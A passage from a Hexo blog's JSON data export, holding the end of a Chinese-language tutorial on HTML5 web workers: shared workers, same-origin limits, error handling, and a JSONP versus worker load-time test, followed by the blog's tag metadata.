counter\n           \t});\n       \t}\n   \t}\n   \tport.start();\n   \tconnections.push(port);\n\n用两个窗口打开这个页面，第一个显示：**Someone just said \"Hello shared worker!\" This is message number 1**，第二个也收到一样的信息，\n但是后面是**message number 2**。\n\n###**【安全性和错误检查】**\n出于安全性的考虑，web worker必须遵守同源策略。同时，它的全局对象是worker对象本身，this和self引用的都是worker对象。   \n只能访问：\n\n1. navigator 对象（仅限appName, appVersion, platform, userAgent）\n2. location 对象（只读）\n3. XMLHttpRequest\n4. setTimeout(), setInterval(), clearTimeout()和clearInterval()方法\n\n不能访问：\n\n1. DOM(不是线程安全的)\n2. window 对象\n3. document 对象\n4. parent 对象\n\nworker内部出现错误时，可以用worker.onerror侦听到，error的事件有三个属性：      \n\n1. filename: 发生错误的文件名\n2. lineno: 代码行号\n3. message: 完整的错误信息\n\n如：\n\n\tworker.onerror = function(e) {\n\t\tconsole.log(e.filename+\"ERROR on line\"+e.lineno+\",msg:\"+e.message);\n\t}\n\n###**【web worker的其他尝试】**\n对于比较消耗时间的操作，我们可看到web worker能够发挥它的作用。比如：大量数据排序，精确到像素的canvas计算等。而我们又知道，jsonp加载数据时，动态创建script标签，加载和执行这些过程都是阻塞式的，而web worker正好可以异步加载，这会是更快的方式吗？带着这个疑问我做了下面的试验，分别用jsonp和worker的方式去加载文件，计算数据返回时延：\n\n\tfunction tryJsonp(){\n\t\tvar d = (new Date()).valueOf();\n\t\tvar jsonp=document.createElement(\"script\");  \n\t    jsonp.type=\"text/javascript\";  \n\t    jsonp.src=\"worker.js?_=\"+d;  \n\t    document.getElementsByTagName(\"head\")[0].appendChild(jsonp);\n\t    jsonp.onload = jsonp.onreadystatechange = function(){  \n\t\t   \tif(!this.readyState||this.readyState=='loaded'||this.readyState=='complete'){  \n\t\t   \t\tconsole.log('jsonp: '+ ((new Date()).valueOf() - d));\n\t\t\t}  \n\t\t}\n\t}\n\tfunction tryWorker(){\n\t\tvar d = (new Date()).valueOf();\n\t\tvar worker = new Worker(\"worker.js\");\n\t\tworker.postMessage({'cmd': 'start', 'msg': 'start'});\n\t\tworker.onmessage = function (event) {\n\t\t\tconsole.log('web worker: '+ ((new Date()).valueOf() - d));\n\t\t};\n\t}\n\n第一次加载是一份1k大小的文件，每个方法重复5次，返回结果为:         \n![1k文件重复5次](/assets/blogImg/web_worker1.png)  \n第二次加载1800k大小的文件，返回结果为：             \n![1800k文件重复5次](/assets/blogImg/web_worker2.png)  \n可以看到对于较小的数据，jsonp还是比web worker要快，这可能是实例化worker对象时带来的影响；而数据偏大时，web worker的加载将会更优，而且它可以异步加载。\n\nTHE END.","slug":"web-worker-learning","updated":1409364870000,"excerpt":"<p>js是单线程的语言，由于此特性，我们在处理并发时需要用到一些技巧，如setTimeout()，setInterval()，调用XMLHttpRequest等。<br>但这里的并发只是非阻塞（参照John Resig的文章<a href=\"http://ejohn.org/blog/how-javascript-timers-work/\" target=\"_blank\" rel=\"external\">How JavaScript Timers Work</a>），真正的多线程编程则需要HTML5的web worker。<br><!-- more --></p>\n<h3 id=\"【worker的使用】\"><strong>【worker的使用】</strong></h3>\n<p>web worker的使用非常简单，线程之间通讯的api与html5 postmessage或node.js里面的socket.io方法类似。</p>\n<p>通讯：      </p>\n<ol>\n<li>发送方：postMessage(data)      </li>\n<li>接收方：onmessage(event)</li>\n</ol>\n<p>终止web worker:        </p>\n<ol>\n<li>子线程: self.close()</li>\n<li>父线程: worker.terminate()</li>\n</ol>\n<p>按照目前w3c规范，web worker分为两种：专用worker(Dedicated Worker)和共享worker(Shared Worker)。<br>","_id":"5rh9yw7oqvbr74iv","categories":[],"photos":[],"link":""}],"Tag":[{"name":"随笔","_id":"jc0qt8cakht35ew1","posts":["0iwg9xhvmgvvuczj","r7svbey4tia1rzgg","otag3mi94ren0bsp","98c6zfn9smu6xcx8","cdarydzboecu4pro","rvtqyve9fcrnc7tb","qpo60xulafk5ixq5","nosvnd7f49ay91t5","j77ksqcn8bx85qdv","ntocna37cemzggqa","ejgxoz23sykcpa2g"]},{"name":"杂谈","_id":"u2apvepnvh8nr37o","posts":["fk39hk7s3pypjbeb","ncj5jut5zltilfwa"]},{"name":"octopress","_id":"93rwbunpa4djpbvp","posts":["fk39hk7s3pypjbeb","am902b2hxspwq0k5"]},{"name":"药别停","_id":"tq61934ev7ievvyb","posts":["otag3mi94ren0bsp","rvtqyve9fcrnc7tb"]},{"name":"生活","_id":"exylnxqv2j55vwu4","posts":["cdarydzboecu4pro","j77ksqcn8bx85qdv","ejgxoz23sykcpa2g"]},{"name":"主题","_id":"q42jg8fjwg8u8ovb","posts":["am902b2hxspwq0k5","6vyj8qonhyxhac9o"]},{"name":"css3","_id":"v22smsab7f83ld0m","posts":["ipboeihcbuv1as13","z9zcwzmbo64nrqca"]},{"name":"html5","_id":"panvos05q85sf6qq","posts":["ipboeihcbuv1as13","375osx67p0wu5lih","i1kmt8yuuodtlx8j","rfb6gfaiprq5is9v","5rh9yw7oqvbr74iv"]},{"name":"游戏","_id":"195v0l438qwq74xu","posts":["qpo60xulafk5ixq5"]},{"name":"设计","_id":"10f9ur1kcl6zfda3","posts":["ncj5jut5zltilfwa","k1v2oh466l4azfkp"]},{"name":"web","_id":"ejm72ndmomwgbvme","posts":["tbybyssv0lnlf6ez","yw1rno2sveoqpnj4","bx203bf5ozwskwbz","ds40w0fe0ddaik1s","9c5bec82eb7nmwzu","3xn0i1tj4eomuxy6","30vdh3d76vimsz0i","5rh9yw7oqvbr74iv"]},{"name":"css","_id":"onq1addfunnbgl8n","posts":["qau4akq5o3g12z9o","o9z1n1le3guof396","lusob7oc7mokplgp"]},{"name":"浏览器","_id":"tl6ojb17wh8ofhtp","posts":["yw1rno2sveoqpnj4","9c5bec82eb7nmwzu"]},{"name":"经验","_id":"m2730xmh9x3etkqg","posts":["bx203bf5ozwskwbz"]},{"name":"产品","_id":"96gic1u1hsdmtnbu","posts":["bx203bf5ozwskwbz","nosvnd7f49ay91t5"]},{"name":"coffeescript","_id":"do9xtt4v8s887wdy","posts":["zpsfn3ys1k8e4hun","zepd4al3srncokzb"]},{"name":"模式","_id":"81g4urrtts7hilv1","posts":["zpsfn3ys1k8e4hun"]},{"name":"hexo","_id":"6pi7ylzkuavucony","posts":["6vyj8qonhyxhac9o"]},{"name":"前端","_id":"b689udghd6s571ss","posts":["375osx67p0wu5lih","rfb6gfaiprq5is9v"]},{"name":"js","_id":"w6w1sbbrofyval78","posts":["375osx67p0wu5lih","epbg09m0e0ztnk2a","zepd4al3srncokzb","7vefn9t51b2ub3oe","i1kmt8yuuodtlx8j","30vdh3d76vimsz0i"]},{"name":"github","_id":"0554rycmagrgjpnt","posts":["375osx67p0wu5lih","7vefn9t51b2ub3oe"]},{"name":"tools","_id":"yefz2ekux4b65n2m","posts":["7vefn9t51b2ub3oe"]},{"name":"性能","_id":"5qajwfhoj8u1e1sg","posts":["rfb6gfaiprq5is9v"]}]}